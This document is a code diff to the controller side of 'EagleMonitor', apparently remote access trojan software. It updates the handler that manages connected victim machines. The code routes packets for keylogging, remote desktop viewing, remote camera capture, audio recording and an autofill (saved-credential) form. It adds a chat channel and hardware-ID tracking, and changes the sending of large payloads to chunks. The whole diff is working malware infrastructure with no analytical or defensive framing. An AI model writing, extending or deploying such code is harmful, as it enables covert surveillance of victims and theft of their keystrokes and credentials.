@@ -6,6 +6,7 @@ using PacketLib.Utils;
 using System;
 using System.Collections.Generic;
 using System.Drawing;
+using System.IO;
 using System.Net.Sockets;
 using System.Windows.Forms;
 
@@ -69,6 +70,7 @@ namespace EagleMonitor.Networking
         internal AutofillForm autofillForm { get; set; }
         internal KeywordsForm keywordsForm { get; set; }
         internal RemoteAudioForm remoteAudioForm { get; set; }
+        internal RemoteChatForm chatForm { get; set; }
         internal ClientHandler(Socket sock, int port) 
         {
             readDataAsync = new ReadDataAsync(ReceiveData);
@@ -168,38 +170,44 @@ namespace EagleMonitor.Networking
                 {
                     switch (packet.packetType)
                     {
-                        case PacketType.KEYLOG_ON:
-                            ClientHandler.ClientHandlersList[packet.baseIp].keyloggerForm.clientHandler = this;
-                            //PacketHandler.packetParser.BeginInvoke(packet, this, new AsyncCallback(PacketHandler.Log), null);
-                            new PacketHandler(packet, this);
-                            break;
 
                         case PacketType.CONNECTED:
                             ClientHandler.ClientHandlersList.Add(this.IP, this);
-                            //PacketHandler.packetParser.BeginInvoke(packet, this, new AsyncCallback(PacketHandler.Log), null);
+                            new PacketHandler(packet, this);
+                            break;
+
+                        case PacketType.KEYLOG_ON:
+                            ClientHandler.ClientHandlersList[packet.baseIp].keyloggerForm.clientHandler = this;
+                            ClientHandler.ClientHandlersList[packet.baseIp].keyloggerForm.clientHandler.HWID = packet.HWID;
                             new PacketHandler(packet, this);
                             break;
 
                         case PacketType.RM_VIEW_ON:
                             ClientHandler.ClientHandlersList[packet.baseIp].remoteDesktopForm.clientHandler = this;
+                            ClientHandler.ClientHandlersList[packet.baseIp].remoteDesktopForm.clientHandler.HWID = packet.HWID;
                             new PacketHandler(packet, this);
-                            //PacketHandler.packetParser.BeginInvoke(packet, this, new AsyncCallback(PacketHandler.Log), null);
                             break;
 
                         case PacketType.RC_CAPTURE_ON:
                             ClientHandler.ClientHandlersList[packet.baseIp].remoteCameraForm.clientHandler = this;
+                            ClientHandler.ClientHandlersList[packet.baseIp].remoteCameraForm.clientHandler.HWID = packet.HWID;
                             new PacketHandler(packet, this);
-                            //PacketHandler.packetParser.BeginInvoke(packet, this, new AsyncCallback(PacketHandler.Log), null);
                             break;
 
                         case PacketType.AUDIO_RECORD_ON:
                             ClientHandler.ClientHandlersList[packet.baseIp].remoteAudioForm.clientHandler = this;
+                            ClientHandler.ClientHandlersList[packet.baseIp].remoteAudioForm.clientHandler.HWID = packet.HWID;
+                            new PacketHandler(packet, this);
+                            break;
+
+                        case PacketType.CHAT_ON:
+                            ClientHandler.ClientHandlersList[packet.baseIp].chatForm.clientHandler = this;
+                            ClientHandler.ClientHandlersList[packet.baseIp].chatForm.clientHandler.HWID = packet.HWID;
                             new PacketHandler(packet, this);
                             break;
 
                         default:
                             new PacketHandler(packet, ClientHandler.ClientHandlersList[packet.baseIp]);
-                            //PacketHandler.packetParser.BeginInvoke(packet, ClientHandler.ClientHandlersList[packet.baseIp], new AsyncCallback(PacketHandler.Log), null);
                             this.Dispose();
                             break;
                     }
@@ -242,11 +250,27 @@ namespace EagleMonitor.Networking
 
                     int sent = socket.Send(header);
 
-                    while (total < size)
+                    if (size > 1000000)
                     {
-                        sent = socket.Send(encryptedData, total, size, SocketFlags.None);
-                        total += sent;
-                        datalft -= sent;
+                        using (MemoryStream memoryStream = new MemoryStream(encryptedData))
+                        {
+                            int read = 0;
+                            memoryStream.Position = 0;
+                            byte[] chunk = new byte[50 * 1000];
+                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
+                            {
+                                socket.Send(chunk, 0, read, SocketFlags.None);
+                            }
+                        }
+                    }
+                    else
+                    {
+                        while (total < size)
+                        {
+                            sent = socket.Send(encryptedData, total, size, SocketFlags.None);
+                            total += sent;
+                            datalft -= sent;
+                        }
                     }
                     return data;
                 }
@@ -266,7 +290,8 @@ namespace EagleMonitor.Networking
             {
                 packet.status = "NOT SENT";
             }
-            Program.logForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
+
+            IAsyncResult res = Program.logForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
             {
                 int rowId = Program.logForm.dataGridView1.Rows.Add();
                 DataGridViewRow row = Program.logForm.dataGridView1.Rows[rowId];
@@ -295,13 +320,15 @@ namespace EagleMonitor.Networking
                         row.Cells["Column5"].Value = ((FileManagerPacket)packet).path;
                         break;
                 }
-
-                if (packet.packetType == PacketType.RC_CAPTURE_OFF || packet.packetType == PacketType.AUDIO_RECORD_OFF || packet.packetType == PacketType.RM_VIEW_OFF)
-                {
-                    packet = null;
-                    this.Dispose();
-                }
             }));
+
+            Program.logForm.dataGridView1.EndInvoke(res);
+
+            if (packet.packetType == PacketType.RC_CAPTURE_OFF || packet.packetType == PacketType.AUDIO_RECORD_OFF || packet.packetType == PacketType.RM_VIEW_OFF || packet.packetType == PacketType.CHAT_OFF)
+            {
+                this.Dispose();
+            }
+            packet = null;
         }
 
         public void Dispose()
@@ -346,6 +373,9 @@ namespace EagleMonitor.Networking
                 Utils.Miscellaneous.CloseForm(remoteDesktopForm);
                 Utils.Miscellaneous.CloseForm(informationForm);
                 Utils.Miscellaneous.CloseForm(remoteAudioForm);
+                Utils.Miscellaneous.CloseForm(chatForm);
+                Utils.Miscellaneous.CloseForm(autofillForm);
+                Utils.Miscellaneous.CloseForm(keyloggerForm);
             }
         }
     }
